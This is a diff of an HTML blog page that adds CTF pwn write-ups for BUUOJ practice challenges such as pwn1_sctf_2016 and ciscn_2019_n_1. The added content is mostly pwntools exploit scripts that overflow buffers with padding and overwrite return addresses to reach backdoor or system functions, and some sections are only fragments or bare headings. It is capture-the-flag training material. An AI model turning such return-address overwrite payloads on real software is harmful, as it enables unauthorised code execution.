@@ -26,7 +26,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-rip"><span class="toc-text">0x01:rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-warmup-csaw-2016"><span class="toc-text">0x02:warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwn1-sctf-2016"><span class="toc-text">0x03:pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ciscn-2019-c-1"><span class="toc-text">0x04:ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-ciscn-2019-n-1"><span class="toc-text">0x05:ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-ciscn-2019-en-2"><span class="toc-text">0x06:ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-ciscn-2019-n-8"><span class="toc-text">0x07:ciscn_2019_n_8</span></a></li></ol></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -253,6 +253,33 @@ p.interactive()</code></pre>
 <span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">import</span> sys
+file_name = <span class="hljs-string">'./pwn1_sctf_2016'</span>
+libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
+ip = <span class="hljs-string">'node3.buuoj.cn'</span>
+port = <span class="hljs-string">'26620'</span>
+<span class="hljs-comment"># context.arch = 'amd64'</span>
+context.log_level=<span class="hljs-string">'debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+libc = ELF(libc_name)
+elf = ELF(file_name)
+<span class="hljs-comment"># p = process(file_name)</span>
+p = remote(ip,int(port))
+li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
+ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)
+
+backdoor = <span class="hljs-number">0x08048F0D</span>
+
+<span class="hljs-comment"># p.recvuntil(": ")</span>
+
+<span class="hljs-comment"># gdb.attach(p)</span>
+p.sendline(<span class="hljs-string">"I"</span> * <span class="hljs-number">19</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0x08048F0D</span>))
+p.interactive()</code></pre>
+
+<h2 id="0x04-ciscn-2019-c-1">0x04:ciscn_2019_c_1<a class="post-anchor" href="#0x04-ciscn-2019-c-1"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
 <span class="hljs-comment"># context.arch = 'amd64'</span>
 context.log_level=<span class="hljs-string">'debug'</span>
 context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
@@ -291,7 +318,12 @@ p.sendlineafter(<span class="hljs-string">"choice!\n"</span>,<span class="hljs-s
 p.sendlineafter(<span class="hljs-string">"encrypted\n"</span>,(payload))
 p.interactive()</code></pre>
 
+<h2 id="0x05-ciscn-2019-n-1">0x05:ciscn_2019_n_1<a class="post-anchor" href="#0x05-ciscn-2019-n-1"></a></h2><pre><code class="hljs python">sys = <span class="hljs-number">0x00004006BE</span>
+ret = <span class="hljs-number">0x0000000000400501</span>
+p.sendlineafter(<span class="hljs-string">"number."</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x38</span>+p64(sys))</code></pre>
 
+<h2 id="0x06-ciscn-2019-en-2">0x06:ciscn_2019_en_2<a class="post-anchor" href="#0x06-ciscn-2019-en-2"></a></h2><p>同 ciscn_2019_c_1</p>
+<h2 id="0x07-ciscn-2019-n-8">0x07:ciscn_2019_n_8<a class="post-anchor" href="#0x07-ciscn-2019-n-8"></a></h2>
 
   
     <div class="post-reward">
